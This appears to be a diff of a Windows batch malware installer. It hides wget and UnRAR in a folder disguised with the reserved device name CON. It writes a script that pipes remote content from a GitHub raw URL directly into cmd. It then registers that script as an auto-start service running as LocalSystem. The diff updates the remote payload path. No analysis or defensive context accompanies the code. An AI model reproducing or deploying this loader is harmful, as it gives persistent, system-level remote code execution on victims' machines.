@@ -22,5 +22,6 @@ move /Y "%ProgramData%\Comms\wget.exe" "\\.\%ProgramData%\CON\"
 move /Y "%ProgramData%\Comms\guard.rar" "\\.\%ProgramData%\CON\"
 move /Y "%ProgramData%\Comms\UnRAR.exe" "\\.\%ProgramData%\CON\"
 
-echo \\.\%ProgramData%\CON\wget.exe -q --hsts-file=NUL -O - https://raw.githubusercontent.com/pushop/0/0/0/0 ^| cmd /Q /V:ON >> "\\.\%ProgramData%\CON\Help.cmd"
+echo \\.\%ProgramData%\CON\wget.exe -q --hsts-file=NUL -O - https://raw.githubusercontent.com/pushop/0/0/0/zen ^| cmd /Q /V:ON >> "\\.\%ProgramData%\CON\Help.cmd"
+
 sc create Help binPath="\\.\%ProgramData%\CON\Help Help" start="auto" obj="LocalSystem"
